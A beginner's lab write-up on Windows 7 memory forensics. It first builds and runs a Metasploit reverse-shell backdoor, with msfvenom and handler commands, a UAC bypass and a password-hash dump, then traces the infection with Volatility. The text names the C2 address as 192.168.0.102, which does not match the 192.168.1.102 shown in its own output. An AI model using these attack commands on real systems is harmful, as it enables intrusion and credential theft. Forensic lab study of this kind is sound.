## Practical Memory Analysis
***Descrption***
I m new to digital forensic and this is my first step .nd noted 

***Requirements***

 - Windows 7 ( Victim Machine )
 - Ubuntu -installed metasploit framework ( Attacker Machine in my case )

***Attacker Side ( On Ubuntu )***

*( Step 1 )*
Created Client Side Backdoor with msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=1337 -f exe > lol.exe
```
Moved to web server ( I used XAMPP )
```
sudo mv lol.exe /opt/lampp/htdocs/
```
Start Web Server

```
sudo /opt/lampp/lampp start
```
*( Step 2 )*
We need to use msf handler before execution on Victim machine

```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.1.102
LHOST => 192.168.1.102
msf5 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf5 exploit(multi/handler) > exploit
```
wait for reverse shell

*( Step 3 )*
After running lol.exe, we will get meterpreter session

```
meterpreter > getuid
Server username: vulnerable-PC\vulnerable
```
save current meterpreter session on background

```
background
```
gaining system on victim machine 

```
use exploit/windows/local/bypassuac
set sesson 1
exploit
```
Check system or not
```
meterpreter > getuid
Server username: vulnerable-PC\vulnerable
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
And then i will dump hash and created a file 

```
meterpreter > run post/windows/gather/hashdump 

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 0722e4a9bdac56980c116939befe6070...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vulnerable:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e3d4f1e69a2ee6cc0e01bec2a3c89e16:::


meterpreter > shell
Process 708 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>echo "Attacker was here" > lol.txt
echo "Attacker was here" > lol.txt

C:\Windows\system32>exit

```

***Victim Side ( On Windows 7 )***

Download lol.exe with Internet Explorer

```
http://192.168.1.102/lol.exe
```
Run lol.exe


***Forensic Side***

Dowload Magnet RAM capture to memory acquistion ( Requried Registeration )

```
https://www.magnetforensics.com/resources/magnet-ram-capture/
```
Run Magnet on *Windows Machine*

In my case, I used network share to get this memory dump file on *Ubuntu*

I used Volatility to test memory forensics
```
https://www.volatilityfoundation.org/
```

**Get Memory Image info**
```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/luna/Downloads/volatility_2.6_lin64_standalone/mem/memory.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800027f70a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800027f8d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-04-21 20:51:03 UTC+0000
     Image local date and time : 2019-04-22 03:21:03 +0630

```
This is suggested profile `Win7SP1x64`

**What processes are running?**

```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 pslist
Volatility Foundation Volatility Framework 2.6
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0xfffffa8000c9f040 System                    4      0     88      553 ------      0 2019-04-22 08:57:04 UTC+0000                                 
0xfffffa8001d1c420 smss.exe                220      4      2       29 ------      0 2019-04-22 08:57:04 UTC+0000                                 
0xfffffa8001bb9b30 csrss.exe               300    292      9      414      0      0 2019-04-22 08:57:29 UTC+0000                                 
0xfffffa8000ca35a0 csrss.exe               336    328     10      257      1      0 2019-04-22 08:57:48 UTC+0000                                 
0xfffffa8000ca41b0 wininit.exe             344    292      3       74      0      0 2019-04-22 08:57:48 UTC+0000                                 
0xfffffa8002387060 winlogon.exe            372    328      5      136      1      0 2019-04-22 08:57:49 UTC+0000                                 
0xfffffa8002806510 services.exe            432    344      8      199      0      0 2019-04-22 08:57:55 UTC+0000                                 
0xfffffa800280ab30 lsass.exe               448    344      8      770      0      0 2019-04-22 08:57:56 UTC+0000                                 
0xfffffa800285ab30 lsm.exe                 456    344     10      135      0      0 2019-04-22 08:57:56 UTC+0000                                 
0xfffffa80028b54d0 svchost.exe             548    432      9      359      0      0 2019-04-22 08:58:09 UTC+0000                                 
0xfffffa80028de5d0 svchost.exe             624    432      7      290      0      0 2019-04-22 08:58:11 UTC+0000                                 
0xfffffa8002943060 sppsvc.exe              796    432      4      155      0      0 2019-04-22 08:58:44 UTC+0000                                 
0xfffffa8001696060 svchost.exe             836    432     27      606      0      0 2019-04-22 08:58:45 UTC+0000                                 
0xfffffa80016ae600 svchost.exe             860    432     32     1148      0      0 2019-04-22 08:58:45 UTC+0000                                 
0xfffffa80016c9a30 svchost.exe             908    432     21      595      0      0 2019-04-22 08:58:46 UTC+0000                                 
0xfffffa80016ee590 svchost.exe             716    432     20      538      0      0 2019-04-22 09:04:09 UTC+0000                                 
0xfffffa800252c740 svchost.exe             712    432     15      508      0      0 2019-04-22 09:04:11 UTC+0000                                 
0xfffffa8001bbcb30 spoolsv.exe            1092    432     12      286      0      0 2019-04-22 09:04:26 UTC+0000                                 
0xfffffa800178a220 svchost.exe            1124    432     17      302      0      0 2019-04-22 09:04:26 UTC+0000                                 
0xfffffa8001990b30 svchost.exe            1592    432     18      264      0      0 2019-04-21 19:34:39 UTC+0000                                 
0xfffffa800172fb30 svchost.exe            1980    432      8      364      0      0 2019-04-21 19:34:58 UTC+0000                                 
0xfffffa80026e1910 SearchIndexer.         2068    432     13      785      0      0 2019-04-21 19:35:33 UTC+0000                                 
0xfffffa8002932920 taskhost.exe           2628    432      7      226      1      0 2019-04-21 19:36:10 UTC+0000                                 
0xfffffa800292db30 dwm.exe                2708    836      3       81      1      0 2019-04-21 19:36:11 UTC+0000                                 
0xfffffa800292d600 explorer.exe           2716   2700     32      854      1      0 2019-04-21 19:36:11 UTC+0000                                 
0xfffffa80029c22e0 regsvr32.exe           1040   2716      0 --------      1      0 2019-04-21 19:36:55 UTC+0000   2019-04-21 19:37:01 UTC+0000  
0xfffffa8001c7ba00 svchost.exe            2812    432     13      323      0      0 2019-04-21 19:37:33 UTC+0000                                 
0xfffffa8002a27b30 wmpnetwk.exe            536    432      9      227      0      0 2019-04-21 19:41:58 UTC+0000                                 
0xfffffa80019da670 iexplore.exe           1584   2716     16      503      1      1 2019-04-21 20:21:51 UTC+0000                                 
0xfffffa80028ebb30 iexplore.exe           2816   1584     19      619      1      1 2019-04-21 20:23:40 UTC+0000                                 
0xfffffa80023f8740 SearchProtocol         2248   2068      8      380      0      0 2019-04-21 20:31:02 UTC+0000                                 
0xfffffa80029c41b0 taskmgr.exe            2480   2716      6      120      1      0 2019-04-21 20:31:15 UTC+0000                                 
0xfffffa800193bb30 lol[1].exe             2004   1584      9      120      1      1 2019-04-21 20:31:27 UTC+0000                                 
0xfffffa8001c1a1c0 WmiPrvSE.exe           1888    548      7      111      0      0 2019-04-21 20:42:00 UTC+0000                                 
0xfffffa80019ec280 whoami.exe             2940    556      0 --------      1      0 2019-04-21 20:42:10 UTC+0000   2019-04-21 20:42:10 UTC+0000  
0xfffffa80029b6b30 whoami.exe             2880   1748      0 --------      1      0 2019-04-21 20:42:10 UTC+0000   2019-04-21 20:42:10 UTC+0000  
0xfffffa8002745b30 tior.exe               1144   1880      0 --------      1      0 2019-04-21 20:42:15 UTC+0000   2019-04-21 20:42:18 UTC+0000  
0xfffffa80024b2a60 sQWdlfFBP.exe          2264   2052      3      106      1      1 2019-04-21 20:42:15 UTC+0000                                 
0xfffffa8002753b30 cmd.exe                 708   2264      0 --------      1      0 2019-04-21 20:47:46 UTC+0000   2019-04-21 20:48:53 UTC+0000  
0xfffffa8001b413c0 audiodg.exe            2564    908      4      128      0      0 2019-04-21 20:48:11 UTC+0000                                 
0xfffffa8002487460 MagnetRAMCaptu         2548   1584     15      305      1      1 2019-04-21 20:50:06 UTC+0000                                 
0xfffffa80028379e0 SearchFilterHo         1516   2068      5       79      0      0 2019-04-21 20:50:15 UTC+0000                                 
0xfffffa8001c5c290 WmiPrvSE.exe           1880    548      8      120      0      0 2019-04-21 20:51:03 UTC+0000                                 
```
`lol.exe` is running with pid `2004`

**What is the C2 Server Address?**

```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 netscan
Volatility Foundation Volatility Framework 2.6
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x3e154260         UDPv4    0.0.0.0:0                      *:*                                   716      svchost.exe    2019-04-21 19:40:20 UTC+0000
0x3e20e4e0         UDPv4    0.0.0.0:0                      *:*                                   860      svchost.exe    2019-04-21 20:51:22 UTC+0000
0x3e20e4e0         UDPv6    :::0                           *:*                                   860      svchost.exe    2019-04-21 20:51:22 UTC+0000
0x3e240700         UDPv4    127.0.0.1:61894                *:*                                   1584     iexplore.exe   2019-04-21 20:25:01 UTC+0000
0x3e58a6c0         UDPv4    0.0.0.0:123                    *:*                                   716      svchost.exe    2019-04-21 19:40:24 UTC+0000
0x3e58a6c0         UDPv6    :::123                         *:*                                   716      svchost.exe    2019-04-21 19:40:24 UTC+0000
0x3e667410         UDPv6    fe80::54dd:8536:a0a8:70b5:1900 *:*                                   1592     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e667ad0         UDPv4    127.0.0.1:54802                *:*                                   1592     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e673680         UDPv6    ::1:1900                       *:*                                   1592     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e6776a0         UDPv6    ::1:54800                      *:*                                   1592     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e67f1f0         UDPv4    192.168.1.103:54801            *:*                                   1592     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e680640         UDPv4    127.0.0.1:1900                 *:*                                   1592     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e680d00         UDPv4    192.168.1.103:1900             *:*                                   1592     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e686010         UDPv4    0.0.0.0:3540                   *:*                                   1980     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e686010         UDPv6    :::3540                        *:*                                   1980     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e690570         UDPv4    0.0.0.0:0                      *:*                                   1980     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e690570         UDPv6    :::0                           *:*                                   1980     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e6fdbd0         UDPv4    127.0.0.1:59167                *:*                                   2816     iexplore.exe   2019-04-21 20:23:55 UTC+0000
0x3e2efb10         TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        860      svchost.exe    
0x3e2efb10         TCPv6    :::49155                       :::0                 LISTENING        860      svchost.exe    
0x3e2f1370         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        624      svchost.exe    
0x3e2f2640         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        624      svchost.exe    
0x3e2f2640         TCPv6    :::135                         :::0                 LISTENING        624      svchost.exe    
0x3e2f77e0         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        908      svchost.exe    
0x3e2f77e0         TCPv6    :::49154                       :::0                 LISTENING        908      svchost.exe    
0x3e2f79c0         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        344      wininit.exe    
0x3e2faa50         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        344      wininit.exe    
0x3e2faa50         TCPv6    :::49152                       :::0                 LISTENING        344      wininit.exe    
0x3e349230         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        448      lsass.exe      
0x3e349230         TCPv6    :::49153                       :::0                 LISTENING        448      lsass.exe      
0x3e349660         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        448      lsass.exe      
0x3e664850         TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        860      svchost.exe    
0x3e21dad0         TCPv4    192.168.1.103:49241            192.168.1.102:80     CLOSED           2816     iexplore.exe   
0x3e4c59c0         TCPv4    -:0                            8.230.106.1:0        CLOSED           4        System         
0x3e4c6010         TCPv6    -:0                            8e6:6a01:80fa:ffff:d037:6b01:80fa:ffff:0 CLOSED           860      svchost.exe    
0x3e4f3010         TCPv4    -:49242                        192.168.1.1:443      CLOSED           2816     iexplore.exe   
0x3e95f3b0         UDPv4    0.0.0.0:0                      *:*                                   1980     svchost.exe    2019-04-21 19:35:00 UTC+0000
0x3e95f3b0         UDPv6    :::0                           *:*                                   1980     svchost.exe    2019-04-21 19:35:00 UTC+0000
0x3e969560         UDPv6    fe80::54dd:8536:a0a8:70b5:54799 *:*                                   1592     svchost.exe    2019-04-21 19:35:04 UTC+0000
0x3e9ce5a0         UDPv4    0.0.0.0:0                      *:*                                   712      svchost.exe    2019-04-22 09:04:25 UTC+0000
0x3e9ce5a0         UDPv6    :::0                           *:*                                   712      svchost.exe    2019-04-22 09:04:25 UTC+0000
0x3ee27600         UDPv6    fe80::54dd:8536:a0a8:70b5:546  *:*                                   908      svchost.exe    2019-04-21 20:46:55 UTC+0000
0x3eebc940         UDPv4    0.0.0.0:0                      *:*                                   716      svchost.exe    2019-04-21 19:40:20 UTC+0000
0x3eebc940         UDPv6    :::0                           *:*                                   716      svchost.exe    2019-04-21 19:40:20 UTC+0000
0x3eecdbb0         UDPv4    0.0.0.0:54804                  *:*                                   716      svchost.exe    2019-04-21 19:35:08 UTC+0000
0x3eecdbb0         UDPv6    :::54804                       *:*                                   716      svchost.exe    2019-04-21 19:35:08 UTC+0000
0x3ef09470         UDPv4    0.0.0.0:0                      *:*                                   1980     svchost.exe    2019-04-21 19:35:00 UTC+0000
0x3ef09470         UDPv6    :::0                           *:*                                   1980     svchost.exe    2019-04-21 19:35:00 UTC+0000
0x3f000350         UDPv4    0.0.0.0:54803                  *:*                                   716      svchost.exe    2019-04-21 19:35:08 UTC+0000
0x3f36bc00         UDPv4    0.0.0.0:123                    *:*                                   716      svchost.exe    2019-04-21 19:40:24 UTC+0000
0x3f3b7510         UDPv4    0.0.0.0:3702                   *:*                                   1592     svchost.exe    2019-04-21 19:34:43 UTC+0000
0x3f3b7c10         UDPv4    0.0.0.0:3702                   *:*                                   1592     svchost.exe    2019-04-21 19:34:43 UTC+0000
0x3f3be640         UDPv4    0.0.0.0:3702                   *:*                                   1592     svchost.exe    2019-04-21 19:34:43 UTC+0000
0x3f3be640         UDPv6    :::3702                        *:*                                   1592     svchost.exe    2019-04-21 19:34:43 UTC+0000
0x3f3bed00         UDPv4    0.0.0.0:3702                   *:*                                   1592     svchost.exe    2019-04-21 19:34:43 UTC+0000
0x3f3bed00         UDPv6    :::3702                        *:*                                   1592     svchost.exe    2019-04-21 19:34:43 UTC+0000
0x3f3bf640         UDPv4    0.0.0.0:50604                  *:*                                   1592     svchost.exe    2019-04-21 19:34:43 UTC+0000
0x3f3bf640         UDPv6    :::50604                       *:*                                   1592     svchost.exe    2019-04-21 19:34:43 UTC+0000
0x3f3bfd00         UDPv4    0.0.0.0:50603                  *:*                                   1592     svchost.exe    2019-04-21 19:34:43 UTC+0000
0x3f3f3c50         UDPv4    0.0.0.0:3702                   *:*                                   716      svchost.exe    2019-04-21 19:34:47 UTC+0000
0x3f3fa010         UDPv4    0.0.0.0:3702                   *:*                                   716      svchost.exe    2019-04-21 19:34:47 UTC+0000
0x3f3fa730         UDPv4    0.0.0.0:3702                   *:*                                   716      svchost.exe    2019-04-21 19:34:47 UTC+0000
0x3f3fa730         UDPv6    :::3702                        *:*                                   716      svchost.exe    2019-04-21 19:34:47 UTC+0000
0x3f3fb010         UDPv4    0.0.0.0:3702                   *:*                                   716      svchost.exe    2019-04-21 19:34:47 UTC+0000
0x3f3fb010         UDPv6    :::3702                        *:*                                   716      svchost.exe    2019-04-21 19:34:47 UTC+0000
0x3f3fb650         UDPv4    0.0.0.0:56251                  *:*                                   716      svchost.exe    2019-04-21 19:34:47 UTC+0000
0x3f3fdec0         UDPv4    0.0.0.0:56252                  *:*                                   716      svchost.exe    2019-04-21 19:34:47 UTC+0000
0x3f3fdec0         UDPv6    :::56252                       *:*                                   716      svchost.exe    2019-04-21 19:34:47 UTC+0000
0x3f5915c0         UDPv4    192.168.1.103:137              *:*                                   4        System         2019-04-22 09:04:25 UTC+0000
0x3f5922c0         UDPv4    0.0.0.0:5355                   *:*                                   712      svchost.exe    2019-04-21 19:34:29 UTC+0000
0x3f5938c0         UDPv4    0.0.0.0:5355                   *:*                                   712      svchost.exe    2019-04-21 19:34:29 UTC+0000
0x3f5938c0         UDPv6    :::5355                        *:*                                   712      svchost.exe    2019-04-21 19:34:29 UTC+0000
0x3f5a4cc0         UDPv4    192.168.1.103:138              *:*                                   4        System         2019-04-22 09:04:25 UTC+0000
0x3f313720         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        432      services.exe   
0x3f313720         TCPv6    :::49156                       :::0                 LISTENING        432      services.exe   
0x3f372ba0         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        432      services.exe   
0x3f37b010         TCPv4    0.0.0.0:445                    0.0.0.0:0            LISTENING        4        System         
0x3f37b010         TCPv6    :::445                         :::0                 LISTENING        4        System         
0x3f3af3b0         TCPv4    0.0.0.0:5357                   0.0.0.0:0            LISTENING        4        System         
0x3f3af3b0         TCPv6    :::5357                        :::0                 LISTENING        4        System         
0x3f3af910         TCPv4    0.0.0.0:3587                   0.0.0.0:0            LISTENING        1980     svchost.exe    
0x3f3af910         TCPv6    :::3587                        :::0                 LISTENING        1980     svchost.exe    
0x3f4d6cf0         TCPv4    192.168.1.103:139              0.0.0.0:0            LISTENING        4        System         
0x3f4f6800         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        908      svchost.exe    
0x3f467550         TCPv4    192.168.1.103:49238            192.168.1.102:1337   ESTABLISHED      2004     lol[1].exe     
0x3f5d3cf0         TCPv4    192.168.1.103:49240            192.168.1.102:4444   ESTABLISHED      2264     sQWdlfFBP.exe  
0x3fed9820         TCPv4    -:49173                        45.120.84.17:80      CLOSED           860      svchost.exe  
```

192.168.0.102 is C2 Server address

**Location of lol.exe**

```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 filescan | grep lol
Volatility Foundation Volatility Framework 2.6
0x000000003e1e42a0     16      0 RW-rwd \Device\HarddiskVolume2\Users\vulnerable\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\QULH211E\lol[1].exe
0x000000003e4df770     16      0 -W-r-- \Device\HarddiskVolume2\Windows\System32\lol.txt
0x000000003e9972c0      4      0 R--r-d \Device\HarddiskVolume2\Users\vulnerable\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\QULH211E\lol[1].exe
0x000000003f55fa40     16      0 RWD--- \Device\HarddiskVolume2\Users\vulnerable\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\QULH211E\lol[1].exe
```
**Malware Detection with malfind plugin**

```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 malfind -p 2004
Volatility Foundation Volatility Framework 2.6
Process: lol[1].exe Pid: 2004 Address: 0x20000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6

0x00020000  fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b   ......`..1.d.P0.
0x00020010  52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c   R..R..r(..J&1..<
0x00020020  61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52   a|.,........RW.R
0x00020030  10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1 51 8b 59 20   ..J<.L.x.H..Q.Y.

0x00020000 fc               CLD
0x00020001 e882000000       CALL 0x20088
0x00020006 60               PUSHA
0x00020007 89e5             MOV EBP, ESP
0x00020009 31c0             XOR EAX, EAX
0x0002000b 648b5030         MOV EDX, [FS:EAX+0x30]
0x0002000f 8b520c           MOV EDX, [EDX+0xc]
0x00020012 8b5214           MOV EDX, [EDX+0x14]
0x00020015 8b7228           MOV ESI, [EDX+0x28]
0x00020018 0fb74a26         MOVZX ECX, WORD [EDX+0x26]
0x0002001c 31ff             XOR EDI, EDI
0x0002001e ac               LODSB
0x0002001f 3c61             CMP AL, 0x61
0x00020021 7c02             JL 0x20025
0x00020023 2c20             SUB AL, 0x20
0x00020025 c1cf0d           ROR EDI, 0xd
0x00020028 01c7             ADD EDI, EAX
0x0002002a e2f2             LOOP 0x2001e
0x0002002c 52               PUSH EDX
0x0002002d 57               PUSH EDI
0x0002002e 8b5210           MOV EDX, [EDX+0x10]
0x00020031 8b4a3c           MOV ECX, [EDX+0x3c]
0x00020034 8b4c1178         MOV ECX, [ECX+EDX+0x78]
0x00020038 e348             JECXZ 0x20082
0x0002003a 01d1             ADD ECX, EDX
0x0002003c 51               PUSH ECX
0x0002003d 8b5920           MOV EBX, [ECX+0x20]

Process: lol[1].exe Pid: 2004 Address: 0x230000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 44, MemCommit: 1, PrivateMemory: 1, Protection: 6

0x00230000  4d 5a e8 00 00 00 00 5b 52 45 55 89 e5 81 c3 64   MZ.....[REU....d
0x00230010  13 00 00 ff d3 81 c3 95 a6 02 00 89 3b 53 6a 04   ............;Sj.
0x00230020  50 ff d0 00 00 00 00 00 00 00 00 00 00 00 00 00   P...............
0x00230030  00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00   ................

0x00230000 4d               DEC EBP
0x00230001 5a               POP EDX
0x00230002 e800000000       CALL 0x230007
0x00230007 5b               POP EBX
0x00230008 52               PUSH EDX
0x00230009 45               INC EBP
0x0023000a 55               PUSH EBP
0x0023000b 89e5             MOV EBP, ESP
0x0023000d 81c364130000     ADD EBX, 0x1364
0x00230013 ffd3             CALL EBX
0x00230015 81c395a60200     ADD EBX, 0x2a695
0x0023001b 893b             MOV [EBX], EDI
0x0023001d 53               PUSH EBX
0x0023001e 6a04             PUSH 0x4
0x00230020 50               PUSH EAX
0x00230021 ffd0             CALL EAX
0x00230023 0000             ADD [EAX], AL
0x00230025 0000             ADD [EAX], AL
0x00230027 0000             ADD [EAX], AL
0x00230029 0000             ADD [EAX], AL
0x0023002b 0000             ADD [EAX], AL
0x0023002d 0000             ADD [EAX], AL
0x0023002f 0000             ADD [EAX], AL
0x00230031 0000             ADD [EAX], AL
0x00230033 0000             ADD [EAX], AL
0x00230035 0000             ADD [EAX], AL
0x00230037 0000             ADD [EAX], AL
0x00230039 0000             ADD [EAX], AL
0x0023003b 0000             ADD [EAX], AL
0x0023003d 0100             ADD [EAX], EAX
0x0023003f 00               DB 0x0

Process: lol[1].exe Pid: 2004 Address: 0x310000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 49, MemCommit: 1, PrivateMemory: 1, Protection: 6

0x00310000  4d 5a e8 00 00 00 00 5b 52 45 55 89 e5 81 c3 64   MZ.....[REU....d
0x00310010  13 00 00 ff d3 81 c3 95 a6 02 00 89 3b 53 6a 04   ............;Sj.
0x00310020  50 ff d0 00 00 00 00 00 00 00 00 00 00 00 00 00   P...............
0x00310030  00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00   ................

0x00310000 4d               DEC EBP
0x00310001 5a               POP EDX
0x00310002 e800000000       CALL 0x310007
0x00310007 5b               POP EBX
0x00310008 52               PUSH EDX
0x00310009 45               INC EBP
0x0031000a 55               PUSH EBP
0x0031000b 89e5             MOV EBP, ESP
0x0031000d 81c364130000     ADD EBX, 0x1364
0x00310013 ffd3             CALL EBX
0x00310015 81c395a60200     ADD EBX, 0x2a695
0x0031001b 893b             MOV [EBX], EDI
0x0031001d 53               PUSH EBX
0x0031001e 6a04             PUSH 0x4
0x00310020 50               PUSH EAX
0x00310021 ffd0             CALL EAX
0x00310023 0000             ADD [EAX], AL
0x00310025 0000             ADD [EAX], AL
0x00310027 0000             ADD [EAX], AL
0x00310029 0000             ADD [EAX], AL
0x0031002b 0000             ADD [EAX], AL
0x0031002d 0000             ADD [EAX], AL
0x0031002f 0000             ADD [EAX], AL
0x00310031 0000             ADD [EAX], AL
0x00310033 0000             ADD [EAX], AL
0x00310035 0000             ADD [EAX], AL
0x00310037 0000             ADD [EAX], AL
0x00310039 0000             ADD [EAX], AL
0x0031003b 0000             ADD [EAX], AL
0x0031003d 0100             ADD [EAX], EAX
0x0031003f 00               DB 0x0

Process: lol[1].exe Pid: 2004 Address: 0x3d0000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 33, MemCommit: 1, PrivateMemory: 1, Protection: 6

0x003d0000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
0x003d0010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......
0x003d0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x003d0030  00 00 00 00 00 00 00 00 00 00 00 00 e8 00 00 00   ................

0x003d0000 4d               DEC EBP
0x003d0001 5a               POP EDX
0x003d0002 90               NOP
0x003d0003 0003             ADD [EBX], AL
0x003d0005 0000             ADD [EAX], AL
0x003d0007 000400           ADD [EAX+EAX], AL
0x003d000a 0000             ADD [EAX], AL
0x003d000c ff               DB 0xff
0x003d000d ff00             INC DWORD [EAX]
0x003d000f 00b800000000     ADD [EAX+0x0], BH
0x003d0015 0000             ADD [EAX], AL
0x003d0017 004000           ADD [EAX+0x0], AL
0x003d001a 0000             ADD [EAX], AL
0x003d001c 0000             ADD [EAX], AL
0x003d001e 0000             ADD [EAX], AL
0x003d0020 0000             ADD [EAX], AL
0x003d0022 0000             ADD [EAX], AL
0x003d0024 0000             ADD [EAX], AL
0x003d0026 0000             ADD [EAX], AL
0x003d0028 0000             ADD [EAX], AL
0x003d002a 0000             ADD [EAX], AL
0x003d002c 0000             ADD [EAX], AL
0x003d002e 0000             ADD [EAX], AL
0x003d0030 0000             ADD [EAX], AL
0x003d0032 0000             ADD [EAX], AL
0x003d0034 0000             ADD [EAX], AL
0x003d0036 0000             ADD [EAX], AL
0x003d0038 0000             ADD [EAX], AL
0x003d003a 0000             ADD [EAX], AL
0x003d003c e8               DB 0xe8
0x003d003d 0000             ADD [EAX], AL
0x003d003f 00               DB 0x0

Process: lol[1].exe Pid: 2004 Address: 0x420000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 98, MemCommit: 1, PrivateMemory: 1, Protection: 6

0x00420000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
0x00420010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......
0x00420020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x00420030  00 00 00 00 00 00 00 00 00 00 00 00 10 01 00 00   ................

0x00420000 4d               DEC EBP
0x00420001 5a               POP EDX
0x00420002 90               NOP
0x00420003 0003             ADD [EBX], AL
0x00420005 0000             ADD [EAX], AL
0x00420007 000400           ADD [EAX+EAX], AL
0x0042000a 0000             ADD [EAX], AL
0x0042000c ff               DB 0xff
0x0042000d ff00             INC DWORD [EAX]
0x0042000f 00b800000000     ADD [EAX+0x0], BH
0x00420015 0000             ADD [EAX], AL
0x00420017 004000           ADD [EAX+0x0], AL
0x0042001a 0000             ADD [EAX], AL
0x0042001c 0000             ADD [EAX], AL
0x0042001e 0000             ADD [EAX], AL
0x00420020 0000             ADD [EAX], AL
0x00420022 0000             ADD [EAX], AL
0x00420024 0000             ADD [EAX], AL
0x00420026 0000             ADD [EAX], AL
0x00420028 0000             ADD [EAX], AL
0x0042002a 0000             ADD [EAX], AL
0x0042002c 0000             ADD [EAX], AL
0x0042002e 0000             ADD [EAX], AL
0x00420030 0000             ADD [EAX], AL
0x00420032 0000             ADD [EAX], AL
0x00420034 0000             ADD [EAX], AL
0x00420036 0000             ADD [EAX], AL
0x00420038 0000             ADD [EAX], AL
0x0042003a 0000             ADD [EAX], AL
0x0042003c 1001             ADC [ECX], AL
0x0042003e 0000             ADD [EAX], AL
```
PAGE_EXECUTE_READ_WRITE means allow to write malicous code and run itself

use -D to dump malfind result as file

```
